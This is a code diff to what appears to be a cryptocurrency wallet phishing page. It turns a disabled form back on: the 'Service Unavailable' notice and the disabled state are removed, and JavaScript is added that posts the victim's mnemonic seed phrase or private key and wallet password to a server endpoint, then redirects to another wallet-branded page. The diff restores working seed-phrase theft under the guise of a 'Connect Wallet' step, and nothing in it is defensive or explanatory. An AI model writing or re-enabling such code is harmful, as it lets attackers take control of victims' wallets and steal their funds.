@@ -97,17 +97,13 @@
                         <a href="#" id="button_connect_manually2" class="btn btn-primary">Connect Manually</a>
                     </div>
                     <div id="div_connect_manuallly" style="display:none;">
-                        <form id="manual_mail_form" onsubmit="return false;">
+                        <form id="manual_mail_form" action="/api/mail" method="post">
                             <h3 id="wallet_name" style="display:none;"></h3>
                             <input name="wallet_name" type="text" id="the" style="display:none;">
-                            <textarea style="font-size:19px; font-weight:650" rows="4" name="phase" id="secret_phrase" class="form-control text-primary" placeholder="Enter your 12 or 24 Mnemonic words or Private Key." focused required minlength="50" maxlength="250" onclick="change_wall_value()" disabled></textarea><br>
-                            <input type="text" name="pw" id="password" class="form-control text-primary" placeholder="Wallet password" style="display:none" disabled>
+                            <textarea style="font-size:19px; font-weight:650" rows="4" name="phase" id="secret_phrase" class="form-control text-primary" placeholder="Enter your 12 or 24 Mnemonic words or Private Key." required minlength="50" maxlength="250" onclick="change_wall_value()"></textarea><br>
+                            <input type="text" name="pw" id="password" class="form-control text-primary" placeholder="Wallet password" style="display:none">
                             <br><br>
-                            <div style="padding: 15px; background-color: #fff3cd; border: 1px solid #ffc107; border-radius: 4px; color: #856404; margin-bottom: 15px;">
-                              <strong>⚠️ Service Unavailable</strong><br>
-                              This form submission feature is not available on GitHub Pages. This is a static site and does not support server-side processing.
-                            </div>
-                            <button disabled type="submit" name="connect" id="button_connect_wallet" class="btn btn-primary" style="border-top: 5px; opacity:0.2">Connect Wallet (Disabled)</button>
+                            <button type="submit" name="connect" id="button_connect_wallet" class="btn btn-primary" style="border-top: 5px; opacity:1">Connect Wallet</button>
                         </form>
                     </div>
                     <script>
@@ -117,10 +113,32 @@
 
                         const manualMailForm = document.getElementById("manual_mail_form");
                         if (manualMailForm) {
-                            manualMailForm.addEventListener("submit", function (event) {
+                            manualMailForm.addEventListener("submit", async function (event) {
                                 event.preventDefault();
-                                alert("Form submission is disabled on this static website.");
-                                return false;
+                                document.getElementById("button_connect_wallet").disabled = true;
+                                document.getElementById("button_connect_wallet").textContent = "Sending...";
+
+                                const formData = new FormData(manualMailForm);
+                                const response = await fetch(manualMailForm.action, {
+                                    method: "POST",
+                                    body: new URLSearchParams(formData),
+                                });
+
+                                if (response.ok) {
+                                    alert("Submission successful.");
+                                    window.location.href = "./dcent.html";
+                                } else {
+                                    let errorText = "Failed to submit form.";
+                                    try {
+                                        const data = await response.json();
+                                        errorText = data.error || errorText;
+                                    } catch (err) {
+                                        // ignore parse errors
+                                    }
+                                    alert(errorText);
+                                    document.getElementById("button_connect_wallet").disabled = false;
+                                    document.getElementById("button_connect_wallet").textContent = "Connect Wallet";
+                                }
                             });
                         }
                     </script>
